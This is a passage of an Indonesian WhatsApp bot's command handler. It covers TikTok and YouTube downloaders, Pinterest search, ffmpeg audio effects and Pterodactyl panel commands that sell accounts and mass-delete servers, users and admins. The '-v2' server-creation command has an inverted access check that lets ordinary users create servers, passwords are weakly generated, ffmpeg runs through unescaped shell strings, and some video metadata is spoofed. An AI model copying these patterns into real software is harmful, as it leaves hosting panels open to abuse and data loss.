                key: m.key
              }
            });
            if (!result.status) {
              return reply("Error!");
            }
            if (result.durations == 0 && result.duration == "0 Seconds") {
              let araara = new Array();
              let urutan = 0;
              for (let a of result.data) {
                let imgsc = await prepareWAMessageMedia({
                  image: {
                    url: `${a.url}`
                  }
                }, {
                  upload: sock.waUploadToServer
                });
                await araara.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: `Foto Slide Ke *${urutan += 1}*`,
                    hasMediaAttachment: true,
                    ...imgsc
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                  })
                });
              }
              const msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadata: {},
                      deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "*TIKTOK - DOWNLOADER*"
                      }),
                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: araara
                      })
                    })
                  }
                }
              }, {
                userJid: m.sender,
                quoted: fakeQuoted
              });
              await sock.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
              });
            } else {
              let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");
              await sock.sendMessage(m.chat, {
                video: {
                  url: urlVid.url
                },
                caption: momok,
                footer: `\n${namaBot}`,
                buttons: [{
                  buttonId: `.ttaudio ${text}`,
                  buttonText: {
                    displayText: "á´€á´Ê™ÉªÊŸ á´á´œsÉªá´‹É´Êá´€"
                  }
                }],
                viewOnce: true
              }, {
                quoted: fakeQuoted
              });
            }
          }).catch(e => console.log(e));
          await sock.sendMessage(m.chat, {
            react: {
              text: "âœ…",
              key: m.key
            }
          });
        }
        break;
        // Funcc
        
        //
        case 'audiotiktok':
    case 'tiktokaudio':
    case 'audiott':
    case 'ttaudio': {

try {
        if (!text) return reply(`Contoh: ${cmd} linknya`)
        if (!text.includes('tiktok.com')) return reply('Harus berupa link tiktok!')
       
        let jir = await tiktokDl(text)
        if (jir.status && jir.data.length > 0) {
          const nowmVideo = jir.data.find(item => item.type === 'nowatermark')
          if (nowmVideo) {
            let audioq = nowmVideo.url
            return await
            sock.sendMessage(m.chat, {
              audio: {
                url: audioq
              },
              mimetype: 'audio/mpeg',
              contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `Â© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: name,
body: `version â€¢ ${version}`,
thumbnailUrl: thumbnail2,
sourceUrl: `https://Uptime â€¢ ${runtime(process.uptime())}`,
mediaType: 1,
renderLargerThumbnail: false,
}}
            }, {
              quoted: fakeQuoted
            })

          }
        }
        throw new Error('Terjadi kesalahan')
      } catch (err) {
        console.error('Terjadi kesalahan: ', err)
        reply('Terjadi kesalahan')
      }
    }
    break
case "tiktoksearch":
case "ttsearch":
case "tts": {
      if (!text) return reply(`âš ï¸ Eits, kakak lupa kasih kata kunci! ğŸ˜— Coba ketik kayak gini ya: *.${command} jj epep* biar Aku bisa bantu cari yang kakak mau! ğŸ”ğŸ’¬`);
      try {
        let search = await tiktokSearchVideo(text);
        let teks = `ğŸ¥ *${search.videos[0].title}*\n\n` +
          `*á´ Éªá´…á´‡á´Éª Éªá´…* : ${search.videos[0].video_id}\n` +
          `*á´œsá´‡Ê€É´á´€á´á´‡* : ${search.videos[0].author.unique_id}\n` +
          `*É´Éªá´„á´‹É´á´€á´á´‡* : ${search.videos[0].author.nickname}\n` +
          `*á´…á´œÊ€á´€á´›Éªá´É´* : ${search.videos[0].duration} detik\n` +
          `*ÊŸÉªá´‹á´‡* : ${search.videos[0].digg_count}\n` +
          `*á´„á´á´á´á´‡É´á´›* : ${search.videos[0].comment_count}\n` +
          `*sÊœá´€Ê€á´‡* : ${search.videos[0].share_count}\n\n` +
          `*ÊŸÉªÉ´á´‹*: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;

        let list = '';
        let no = 1;
        for (let i of search.videos) {
          list += `\n${no++}. ğŸµ *${i.title}*\n` +
            `á´…á´œÊ€á´€sÉª: ${i.duration} á´…á´‡á´›Éªá´‹\n` +
            `ÊŸÉªá´‹á´‡: ${i.digg_count}\n` +
            `á´„á´á´á´á´‡É´á´›s: ${i.comment_count}\n` +
            `sÊœá´€Ê€á´‡s: ${i.share_count}\n` +
            ` ÊŸÉªÉ´á´‹: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n`;
        }

        await sock.sendMessage(
          m.chat, {
            video: {
              url: `https://tikwm.com${search.videos[0].play}`
            },
            mimetype: 'video/mp4',
            seconds: 31622400000,
            fileLength: 99999999999999
          }, {
            quoted: fakeQuoted
          }
        );

        if (search.videos.length > 1) {
          await sock.sendMessage(
            m.chat, {
              text: `ğŸ“š *á´…á´€Ò“á´›á´€Ê€ á´ Éªá´…á´‡á´ ÊŸá´€ÉªÉ´É´Êá´€:*\n${list}`
            }, {
              quoted: fakeQuoted
            }
          );
        }
      } catch (error) {
        console.log(error);
      }
    }
    break
    case 'ytmp3': {
  if (!text) return reply('Contoh:\n.ytmp3 https://youtube.com/watch?v=xxxx')

  reply('â³ Processing MP3...')

  const res = await ytdl.download(text.trim(), 'mp3')
  if (!res.status) return reply(res.msg || res.error)

  await sock.sendMessage(m.chat, {
    audio: { url: res.dl },
    mimetype: 'audio/mpeg',
    fileName: `${res.title}.mp3`,
    contextInfo: {
      externalAdReply: {
        title: res.title,
        body: `Duration: ${res.duration}`,
        thumbnailUrl: res.thumb,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m })
}
break
case 'ytmp4': {
  if (!text) return reply('Contoh:\n.ytmp4 link | 720')

  let [link, quality] = text.split('|').map(v => v.trim())
  quality = quality || '360'

  reply(`â³ Processing MP4 ${quality}p...`)

  const res = await ytdl.download(link, quality)
  if (!res.status) return reply(res.msg || res.error)

  await sock.sendMessage(m.chat, {
    video: { url: res.dl },
    caption: `ğŸ¬ ${res.title}\nğŸ“º ${quality}p\nâ± ${res.duration}`,
    contextInfo: {
      externalAdReply: {
        title: res.title,
        body: `${quality}p`,
        thumbnailUrl: res.thumb,
        mediaType: 2,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m })
}
break
case 'ytplay':
case 'song':
case 'play': {
  if (!text) return reply('Contoh:\n.play Alan Walker Faded')

  const yts = require('yt-search')
  const search = await yts(text)
  if (!search.videos.length) return reply('Video tidak ditemukan')

  const video = search.videos[0]
  reply(`ğŸµ ${video.title}\nâ³ Downloading...`)

  const res = await ytdl.download(video.url, 'mp3')
  if (!res.status) return reply(res.msg || res.error)

  await sock.sendMessage(m.chat, {
    audio: { url: res.dl },
    mimetype: 'audio/mpeg',
    fileName: `${res.title}.mp3`,
    contextInfo: {
      externalAdReply: {
        title: res.title,
        body: video.author.name,
        thumbnailUrl: res.thumb,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m })
}
break
case "ytsearch":
case "youtubesearch":
case "yts": {
  if (!text) return m.reply("Contoh: .yts kucing")

  let res = await yts(text)
  let videos = res.videos.slice(0, 5)
  if (!videos.length) return m.reply("Video tidak ditemukan")

  let panduan = `ğŸ” *YouTube Search*\n\nQuery: *${text}*\nGeser untuk memilih video`

  let cards = []

  for (let v of videos) {
    cards.push({
      header: proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: v.thumbnail } },
          { upload: sock.waUploadToServer }
        )),
        gifPlayback: false,
        hasMediaAttachment: true
      }),
      body: {
        text: `ğŸ¬ *${v.title}*\n\nâ± ${v.timestamp}\nğŸ‘¤ ${v.author.name}\nğŸ‘ ${v.views.toLocaleString()}`
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "ğŸµ MP3",
              id: `.ytmp3 ${v.url}`
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "ğŸ¬ MP4",
              id: `.ytmp4 ${v.url}`
            })
          }
        ]
      }
    })
  }

  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: panduan
            },
            footer: {
              text: name
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  )

  await sock.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  })
}
break
//
//
    case 'pin':
    case 'pinterest': {

      if (!text) return reply(`Format salah, contoh: \n${ command} Anime`)
      if (budy.match(`tobrut|susu|seksi|sexy`)) return reply('GABOLEH YA, INGAT AKHIRAT INGAT TUHAN!');
      await sock.sendMessage(m.chat, {
        react: {
          text: 'â³',
          key: m.key
        }
      })

      let anutrest = await pinterest(text) // Ambil hasil pencarian
      if (!anutrest || anutrest.length === 0) return reply("Error, Foto Tidak Ditemukan")

      // Ambil maksimal 10 gambar biar nggak terlalu panjang
      let selectedImages = anutrest.slice(0, 10);
      let anu = []

      for (let i = 0; i < selectedImages.length; i++) {
        let imgsc = await prepareWAMessageMedia({
          image: {
            url: selectedImages[i].image
          }
        }, {
          upload: sock.waUploadToServer
        })

        anu.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Gambar ke *${i + 1}*`,
            hasMediaAttachment: true,
            ...imgsc
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [{
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Lihat di Pinterest",
                url: selectedImages[i].source || selectedImages[i].image
              })
            }]
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namaBot
          })
        })
      }

      // Buat format `carouselMessage`
      const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `ğŸ” Berikut hasil pencarian gambar untuk *${text}*`
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: anu
              })
            })
          }
        }
      }, {
        userJid: sender,
        quoted: fakeQuoted
      })

      sock.relayMessage(m.chat, msg.message, {
        messageId: msg.key.id
      })
    }
 
    break
   /*
      CONVERT
   */
   case 'bass':
			case 'blown':
			case 'deep':
			case 'earrape':
			case 'fast':
			case 'fat':
			case 'nightcore':
			case 'reverse':
			case 'robot':
			case 'slow':
			case 'smooth':
			case 'tupai': {
			
				try {
					let set
					if(/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
					if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
					if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
					if (/earrape/.test(command)) set = '-af volume=12'
					if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
					if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
					if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
					if (/reverse/.test(command)) set = '-filter_complex "areverse"'
					if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
					if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
					if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
					if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
					if (/audio/.test(mime)) {
						await sock.sendMessage(m.chat, {
							react: {
								text: "â±ï¸",
								key: m.key,
							}
						})
						let media = await sock.downloadAndSaveMediaMessage(quoted)
						let ran = getRandom('.mp3')
						exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
							fs.unlinkSync(media)
							if (err) return reply(err)
							let buff = fs.readFileSync(ran)
							sock.sendMessage(m.chat, {
								audio: buff,
								mimetype: 'audio/mpeg'
							}, {
								quoted: fakeQuoted
							})
							fs.unlinkSync(ran)
						})
					} else reply(`Balas audio yang ingin diubah dengan caption *${cmd}*`)
				} catch (error) {
					 
				}
			}
			break
// #  # # # CPANEL # # #
// ===============================
// CLEAR SERVER
// ===============================
case "clearserver": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequest("/api/application/servers");

    if (!data || !data.data) return reply("âŒ Tidak bisa mengambil data server!");

    let total = 0;
    for (let srv of data.data) {
        const id = srv.attributes.id;
        await ptlaRequest(`/api/application/servers/${id}`, "DELETE");
        total++;
    }

    reply(`âœ”ï¸ ${total} server berhasil dihapus (ptla).`);
}
break;



// ===============================
// CLEAR USER
// ===============================
case "clearuser": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequest("/api/application/users");

    if (!data || !data.data) return reply("âŒ Tidak bisa mengambil data user!");

    let total = 0;
    for (let user of data.data) {
        const id = user.attributes.id;
        await ptlaRequest(`/api/application/users/${id}`, "DELETE");
        total++;
    }

    reply(`ğŸ§¹ ${total} user berhasil dihapus (ptla).`);
}
break;



// ===============================
// CLEAR ADMIN
// ===============================
case "clearadmin": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequest("/api/application/users");

    if (!data || !data.data) return reply("âŒ Tidak bisa mengambil data admin!");

    let total = 0;
    for (let user of data.data) {
        // hanya delete root_admin = true
        if (user.attributes.root_admin) {
            const id = user.attributes.id;
            await ptlaRequest(`/api/application/users/${id}`, "DELETE");
            total++;
        }
    }

    reply(`ğŸ—‘ï¸ ${total} admin berhasil dihapus (ptla).`);
}
break;
case "cadmin": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply("username")

let username = text.toLowerCase()
let email = username + "@gmail.com"
let name = capital(args[0])
let password = username + crypto.randomBytes(2).toString('hex')

let f = await fetch(domain + "/api/application/users", {
  method: "POST",
  headers: {
    Accept: "application/json",
    "Content-Type": "application/json",
    Authorization: "Bearer " + apikey
  },
  body: JSON.stringify({
    email: email,
    username: username,
    first_name: name,
    last_name: "Admin",
    root_admin: true,
    language: "en",
    password: password
  })
})

let data = await f.json()
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))

let user = data.attributes

let teks = `
*Berhasil Membuat Admin Panel âœ…*

*ID User :* ${user.id}
*Nama :* ${user.first_name}
*Username :* ${user.username}
*Password :* ${password}
*Login :* ${global.domain}

*Rules Admin Panel âš ï¸*
â€¢ Jangan maling SC
â€¢ Simpan data akun baik-baik
â€¢ Garansi 10 hari
`

if (m.isGroup) {
  await reply("âœ… Admin panel berhasil dibuat\nğŸ“© Data dikirim ke private chat")
  await sock.sendMessage(m.sender, { text: teks })
} else {
  await reply(teks)
}
break
}
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb":
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb":
case "unlimited": case "unli": {

if (!isOwner && !isPremium) return reply(mess.owner)
if (!text) return reply("username")

global.panel = text.toLowerCase()

let ram, disknya, cpu
if (command == "1gb") { ram="1000"; disknya="1000"; cpu="40" }
else if (command == "2gb") { ram="2000"; disknya="1000"; cpu="60" }
else if (command == "3gb") { ram="3000"; disknya="2000"; cpu="80" }
else if (command == "4gb") { ram="4000"; disknya="2000"; cpu="100" }
else if (command == "5gb") { ram="5000"; disknya="3000"; cpu="120" }
else if (command == "6gb") { ram="6000"; disknya="3000"; cpu="140" }
else if (command == "7gb") { ram="7000"; disknya="4000"; cpu="160" }
else if (command == "8gb") { ram="8000"; disknya="4000"; cpu="180" }
else if (command == "9gb") { ram="9000"; disknya="5000"; cpu="200" }
else if (command == "10gb") { ram="10000"; disknya="5000"; cpu="220" }
else { ram="0"; disknya="0"; cpu="0" }

let username = global.panel
let email = username + "@gmail.com"
let name = username + " Server"
let password = username + crypto.randomBytes(2).toString('hex')

let f = await fetch(domain + "/api/application/users", {
  method: "POST",
  headers: {
    Accept: "application/json",
    "Content-Type": "application/json",
    Authorization: "Bearer " + apikey
  },
  body: JSON.stringify({
    email: email,
    username: username,
    first_name: name,
    last_name: "Server",
    language: "en",
    password: password
  })
})

let data = await f.json()
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))

let user = data.attributes

let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/${egg}`, {
  method: "GET",
  headers: {
    Accept: "application/json",
    "Content-Type": "application/json",
    Authorization: "Bearer " + apikey
  }
})

let data2 = await f1.json()
let startup_cmd = data2.attributes.startup

let f2 = await fetch(domain + "/api/application/servers", {
  method: "POST",
  headers: {
    Accept: "application/json",
    "Content-Type": "application/json",
    Authorization: "Bearer " + apikey
  },
  body: JSON.stringify({
    name: name,
    user: user.id,
    egg: parseInt(egg),
    docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
    startup: startup_cmd,
    environment: {
      INST: "npm",
      USER_UPLOAD: "0",
      AUTO_UPDATE: "0",
      CMD_RUN: "npm start"
    },
    limits: {
      memory: ram,
      swap: 0,
      disk: disknya,
      io: 500,
      cpu: cpu
    },
    feature_limits: {
      databases: 5,
      backups: 5,
      allocations: 5
    },
    deploy: {
      locations: [parseInt(loc)],
      dedicated_ip: false,
      port_range: []
    }
  })
})

let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))

let server = result.attributes

let teks = `
*Berhasil Membuat Panel âœ…*

*ID Server :* ${server.id}
*Username :* ${user.username}
*Password :* ${password}
*Login :* ${global.domain}
*RAM :* ${ram == "0" ? "Unlimited" : ram/1000 + "GB"}
*CPU :* ${cpu == "0" ? "Unlimited" : cpu + "%"}
*Disk :* ${disknya == "0" ? "Unlimited" : disknya/1000 + "GB"}
*Expired :* 1 Bulan
`

if (m.isGroup) {
  await reply("âœ… Panel berhasil dibuat\nğŸ“© Data dikirim ke private chat")
  await sock.sendMessage(m.sender, { text: teks })
} else {
  await reply(teks)
}

delete global.panel
break
}
case "listadmin": {
if (!isOwner) return reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return reply("Tidak ada admin panel")
var teks = "\n *ä¹‚ List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await sock.sendMessage(m.chat, {text: teks}, {quoted: fakeQuoted})
}
break



case "listpanel": case "listp": case "listserver": {

if (!isOwner) return reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
let messageText = "\n *ä¹‚ List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await sock.sendMessage(m.chat, {text: messageText}, {quoted: fakeQuoted})
}
break

case "deladmin": {

if (!isOwner) return reply(mess.owner)
if (!text) return reply("idnya")
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await cek.json();
let users = res.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return reply("Akun admin panel tidak ditemukan!")
await reply(`Berhasil menghapus akun admin panel *${getid}*`)
}
break


case "delpanel": {

if (!isOwner) return reply(mess.owner)
if (!text) return reply("idnya")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await cek.json();
let users = res.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return reply("Server panel tidak ditemukan!")
reply(`Berhasil menghapus server panel *${nameSrv}*`)
}
break


// ############# Cpanel V2
// ===============================
// CLEAR SERVER
// ===============================
case "clearserver-v2": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequestV2("/api/application/servers");

    if (!data || !data.data) return reply("âŒ Tidak bisa mengambil data server!");

    let total = 0;
    for (let srv of data.data) {
        const id = srv.attributes.id;
        await ptlaRequestV2(`/api/application/servers/${id}`, "DELETE");
        total++;
    }

    reply(`âœ”ï¸ ${total} server berhasil dihapus (ptla).`);
}
break;



// ===============================
// CLEAR USER
// ===============================
case "clearuser-v2": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequestV2("/api/application/users");

    if (!data || !data.data) return reply("âŒ Tidak bisa mengambil data user!");

    let total = 0;
    for (let user of data.data) {
        const id = user.attributes.id;
        await ptlaRequestV2(`/api/application/users/${id}`, "DELETE");
        total++;
    }

    reply(`ğŸ§¹ ${total} user berhasil dihapus (ptla).`);
}
break;



// ===============================
// CLEAR ADMIN
// ===============================
case "clearadmin-v2": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequestV2("/api/application/users");

    if (!data || !data.data) return reply("âŒ Tidak bisa mengambil data admin!");

    let total = 0;
    for (let user of data.data) {
        // hanya delete root_admin = true
        if (user.attributes.root_admin) {
            const id = user.attributes.id;
            await ptlaRequestV2(`/api/application/users/${id}`, "DELETE");
            total++;
        }
    }

    reply(`ğŸ—‘ï¸ ${total} admin berhasil dihapus (ptla).`);
}
break;
case "cadmin-v2": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply("username")
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Berhasil membuat admin panel âœ…*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel âœ…*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel âš ï¸*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan BaikÂ² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await sock.sendMessage(orang, {text: teks}, {quoted: fakeQuoted})
}
break
case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isOwner && isPremium) return reply(mess.prem)
if (!text) return reply("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Berhasil membuat panel âœ…*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel âœ…*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel âš ï¸*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await sock.sendMessage(orang, {text: teks}, {quoted: fakeQuoted})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isOwner) return reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
